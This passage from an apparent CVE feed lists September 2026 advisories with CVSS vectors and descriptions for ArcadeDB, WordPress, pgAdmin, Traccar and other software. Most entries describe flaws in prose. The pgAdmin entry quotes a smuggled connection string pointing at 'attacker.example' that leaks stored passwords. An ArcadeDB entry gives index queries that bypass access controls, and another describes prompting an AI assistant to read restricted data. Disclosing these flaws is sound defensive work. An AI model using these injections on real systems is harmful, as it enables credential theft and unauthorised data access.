| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-09-17T15:16:52.447 |

Dell OpenManage Server Administrator, versions prior to 11.1.0.3, contains an Improper Privilege Management vulnerability. A high privileged attacker with remote access could potentially exploit this vulnerability, leading to Elevation of privileges.

### CVE-2026-93598

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-184` |
| Published | 2026-09-18T14:19:11.247 |

ArcadeDB (Maven artifact com.arcadedb:arcadedb-engine) through 26.8.1 contains an incomplete deny-list in the polyglot script sandbox: com.arcadedb.query.polyglot.HostClassLookupFilter.DENIED lists java.util.ResourceBundle as a bare class name, which is matched by exact equality and therefore does not cover its subclasses, while ScriptTriggerExecutor.ALLOWED_PACKAGES permits java.util.*. A user with the UPDATE_SCHEMA privilege (sufficient to create or alter a JavaScript trigger; no server-admin rights required) can reference java.util.PropertyResourceBundle or java.util.ListResourceBundle and invoke the inherited static ResourceBundle.getBundle(String) to read .properties resources from the application classpath, which the sandbox (IOAccess.NONE, with java.io.**, java.nio.** and java.net.** denied) is intended to make unreachable. This can disclose packaged application configuration such as database credentials and API keys; the advisory states the issue does not provide arbitrary host filesystem read or remote code execution. Fixed in 26.9.1.

### CVE-2026-93595

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-18T14:19:10.757 |

ArcadeDB before 26.9.1 contains an access control bypass vulnerability in the query_database tool exposed through the AI chat endpoints. The tool executes queries without binding the authenticated principal to DatabaseContext, causing per-type and per-bucket ACL checks to silently no-op and allowing authenticated users to read data they are explicitly denied at the per-type level. Attackers can prompt the AI assistant to execute queries against restricted types or buckets to retrieve sensitive data that would be rejected through normal query endpoints.

### CVE-2026-93594

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-18T14:19:10.587 |

ArcadeDB (Maven artifact com.arcadedb:arcadedb-engine) through 26.8.1 enforces its per-type/per-record access-control rules only in LocalBucket, keyed on file id. Query-execution paths that reach record data through LSM index files or the TimeSeries engine never invoke that permission check, so an authenticated user who is denied readRecord/deleteRecord on a type can still, with a single ordinary SQL statement, read the type's indexed key values and record IDs (e.g. SELECT key, rid FROM INDEX:Type[field]), read MAX/MIN values via the index shortcut, read and count TimeSeries samples, learn the type's record count, and delete index entries (DELETE FROM INDEX:Type[field]), which desynchronizes the index from the data and can defeat unique constraints. Index and type names needed for exploitation are discoverable because SELECT FROM schema:indexes is unfiltered. The issue affects both embedded and server deployments and all transports (HTTP, Bolt, Postgres, Gremlin) once a principal is bound. Fixed in 26.9.1.

### CVE-2026-40539

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-295` |
| Published | 2026-09-18T09:16:41.423 |

An improper certificate validation vulnerability in Email API in Synology DiskStation Manager (DSM) before 7.2.1-69057-10, 7.2.2-72806-7 and 7.3.2-86009-2 allows man-in-the-middle attackers to read or write arbitrary files and conduct denial-of-service attacks.

### CVE-2026-93485

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T06:16:41.970 |

Improper neutralization of input during web page generation ('cross-site scripting') vulnerability in Automattic WordPress core allows DOM-Based XSS.


This issue affects WordPress versions 7.1 before 7.1.1; 7.0 through 7.0.4; 6.9 through 6.9.7; 6.8 through 6.8.8; 6.7 through 6.7.7; 6.6 through 6.6.7; 6.5 through 6.5.10; 6.4 through 6.4.10; 6.3 through 6.3.10; 6.2 through 6.2.11; 6.1 through 6.1.12; 6.0 through 6.0.14; 5.9 through 5.9.16; 5.8 through 5.8.15; 5.7 through 5.7.17; 5.6 through 5.6.19; 5.5 through 5.5.20; 5.4 through 5.4.21; 5.3 through 5.3.23; 5.2 through 5.2.26; 5.1 through 5.1.24; 5.0 through 5.0.27; 4.9 through 4.9.31; 4.8 through 4.8.30; and 4.7 through 4.7.35.




The Unauthenticated Stored XSS vulnerability in the WordPress core can be reproduced on a default WordPress installation. Comment moderation is disabled by default, and the requirement for commenters to have a previously approved comment can be bypassed.

### CVE-2026-90978

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-284` |
| Published | 2026-09-18T06:16:41.730 |

The Filter Gallery WordPress plugin before 1.1.5 does not verify the nonce on several of its AJAX handlers when the nonce field is omitted, and applies no capability check, allowing low-privileged users to overwrite the content of arbitrary posts and delete the Filter Gallery WordPress plugin before 1.1.5's stored gallery options.

### CVE-2026-93455

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-18T02:17:08.960 |

django-page-cms through 2.0.13 fails to properly validate page permissions in admin helper views, allowing any staff account to read arbitrary page content and stored media paths. Attackers with low-privilege staff credentials can enumerate content identifiers and access unpublished drafts, page listings, and file paths without proper authorization checks.

### CVE-2026-54608

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-345;CWE-862` |
| Published | 2026-09-17T22:17:01.233 |

MythicalDash is a Pterodactyl client area. In 3.5.4-aurora and earlier, GET /api/stripe/process in backend/app/Api/System/Gateways/Stripe.php creates a pending row in mythicaldash_stripe_payments before Stripe checkout succeeds and embeds the payment code in the success redirect, while GET /api/stripe/processed accepts that code without constructing a Session, checking ownership, or retrieving the Stripe Checkout Session to require payment_status to be paid and amount_total to match the expected charge. An ordinary authenticated user can request an attacker-selected coins amount, abandon or fail payment, and submit the pending code directly to the unauthenticated processed endpoint. StripeDB::isPending() then permits User::addCreditsAtomic() to grant the unpaid amount and mark the row processed even though Stripe has not confirmed payment. This permits arbitrary free virtual-currency top-ups and direct financial loss through consumption of hosting resources. No fixed version is available as of this review.

### CVE-2026-86049

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-532` |
| Published | 2026-09-17T21:17:50.213 |

Jupyter Server is the backend for Jupyter web applications. Prior to version 2.21.0, the 5xx request logging path in jupyter_server/log.py copies the Referer header into a JSON header block without applying the token scrubbing used for the request URI. A request that returns HTTP 500 while the Referer contains a token-bearing URL can therefore write that token to server logs in plaintext. An attacker who can read those logs can recover the token and use the affected user's Jupyter Server permissions. This issue is fixed in version 2.21.0.

### CVE-2026-54510

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N` |
| Weaknesses | `CWE-287;CWE-352` |
| Published | 2026-09-17T21:17:16.237 |

Speakr is a personal, self-hosted web application designed for transcribing audio recordings. Prior to 0.8.21-alpha, the csrf_exempt_for_api_tokens() before_request hook in src/app.py calls csrf.exempt(view_func), permanently adding the selected view to Flask-WTF's process-global exemption set. The is_token_authenticated() function in src/utils/token_auth.py calls extract_token_from_request() and treats any present token, including request.args.get('token'), as authenticated without hashing the token, querying the database, or checking validity. A network-reachable attacker can therefore send a false token to disable CSRF protection for the targeted view for the worker lifetime. Because the exemption applies to the view function across HTTP methods, a cross-origin GET to /account with a query token can poison CSRF state for a later state-changing POST without triggering CORS preflight. This browser sequence requires attacker-controlled content on a sibling subdomain under the documented cookie conditions. The bypass can modify profile data, custom prompts, transcription settings, preferences, and administrative status through routes such as admin_toggle_admin. The change_password route also skips current-password verification when current_user.password is empty, allowing the chain to set a local password on an SSO-only account and bypass SSO. This issue is fixed in version 0.8.21-alpha.

### CVE-2026-54524

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T19:16:50.673 |

Frappe HR is an open-source human resources management solution (HRMS). Prior to 16.7.0, an authenticated user with the HR User role can inject SQL through filters in the Salary Payments Based on Payment Mode report. In hrms/payroll/report/salary_payments_based_on_payment_mode/salary_payments_based_on_payment_mode.py, get_conditions constructs filter clauses from user-controlled values and get_data incorporates those clauses into a string-formatted SQL query, allowing extraction of arbitrary database data. This issue is fixed in 16.7.0.

### CVE-2026-52851

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T19:16:49.680 |

Traccar is an open source GPS tracking system. Prior to 6.14.0, an authenticated, non-readonly user with access to an object usable in a permission pair can submit DELETE /api/permissions with an extra attacker-controlled JSON key. Permission(LinkedHashMap<String, Long>) in src/main/java/org/traccar/model/Permission.java validates only the first two keys, but DatabaseStorage.removePermission() in src/main/java/org/traccar/storage/DatabaseStorage.java concatenates every map key into the SQL WHERE clause as a column identifier. The extra key therefore becomes attacker-controlled SQL and provides a blind boolean or error oracle that can extract arbitrary database values, including administrator email, password hashes, and salts, or conditionally delete permission rows. Unauthenticated requests are rejected. This issue is fixed in 6.14.0.

### CVE-2026-44236

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H` |
| Weaknesses | `CWE-122` |
| Published | 2026-09-17T18:16:44.503 |

rabbitmq-c is a C-language AMQP client library for RabbitMQ. Prior to 0.16.0, a malicious AMQP server can send an undersized connection.tune.frame_max value during amqp_login(), and rabbitmq-c accepts the value in amqp_login_inner() in librabbitmq/amqp_socket.c. amqp_tune_connection() in librabbitmq/amqp_connection.c uses frame_max to reallocate the outbound buffer without enforcing AMQP_FRAME_MIN_SIZE. Immediate serialization of connection.tune-ok through amqp_frame_to_bytes() writes beyond the undersized heap allocation, causing memory corruption and likely denial of service. An on-path attacker can also trigger the flaw against plaintext AMQP traffic. Code execution is theoretically possible but was not demonstrated. This issue is fixed in version 0.16.0.

### CVE-2026-93014

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T16:18:35.670 |

RosarioSIS versions before 12.9 fail to validate the filename request parameter in Users and Students modules, allowing authenticated users to unlink allow-listed files via path traversal. Attackers can use parent-directory sequences to escape upload directories and delete CSS, XML, JSON resources and other users' documents throughout the installation.

### CVE-2026-86862

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-88;CWE-522;CWE-918` |
| Published | 2026-09-17T16:18:17.717 |

pgAdmin 4's Restore and Maintenance tools passed the client-supplied 'database' field directly as the value of the --dbname option given to pg_restore and psql. libpq expands a database name containing an equals sign into a full connection string, and connection keywords embedded in that value take precedence over the --host and --port arguments that pgAdmin supplies. A value such as 'host=attacker.example port=5432 dbname=x' therefore redirected the utility to a server chosen by the requesting user rather than the server the operation was invoked against. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection presents that credential to the attacker-nominated endpoint, which may capture it. The redirection additionally permits outbound connections from the pgAdmin host to arbitrary network addresses, including hosts not otherwise reachable by the requesting user.

The behaviour is reachable by any authenticated user holding the tools_restore or tools_maintenance permission, both of which the default User role grants. The Maintenance tool was not affected in the earliest releases, where the value was wrapped by a quoting helper that incidentally prevented expansion; it became affected when that wrapper was removed.

The fix supplies the target database in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. Where pg_restore requires a --dbname argument to be present, an empty value is passed, which contains no equals sign and is therefore not expanded, while the real name is taken from the environment.

This issue affects pgAdmin 4: from the introduction of the --dbname argument in the Restore and Maintenance tools before 9.18.

### CVE-2026-45720

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-294;CWE-367` |
| Published | 2026-09-17T20:16:49.190 |

Omni manages Kubernetes on bare metal, virtual machines, or in a cloud. Prior to 1.6.6 and from 1.7.0 until 1.7.3, SAML.getSession in internal/pkg/auth/interceptor/saml.go checks SAMLAssertion.Used and marks it used in separate state operations. Concurrent requests carrying the same captured saml-session token can each observe the assertion as unused and obtain authentication as the victim before either update is visible. The attacker can invoke SAML-protected gRPC endpoints, use ConfirmPublicKey to create multiple persistent credentials tied to the victim, and generate audit entries attributed to the victim, with the resulting access potentially affecting confidentiality, integrity, and availability according to the victim's privileges. This issue is fixed in versions 1.6.6 and 1.7.3.

### CVE-2026-93015

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787;CWE-1284` |
| Published | 2026-09-17T16:18:35.847 |

BlueKitchen BTstack through 1.8.2 fails to validate the peer-reported endpoint count against table bounds in A2DP stream endpoint discovery. A bonded peer can send an AVDTP DISCOVER response with more endpoints than the fixed table holds, causing out-of-bounds writes that corrupt adjacent static objects and crash the process or sever event delivery.
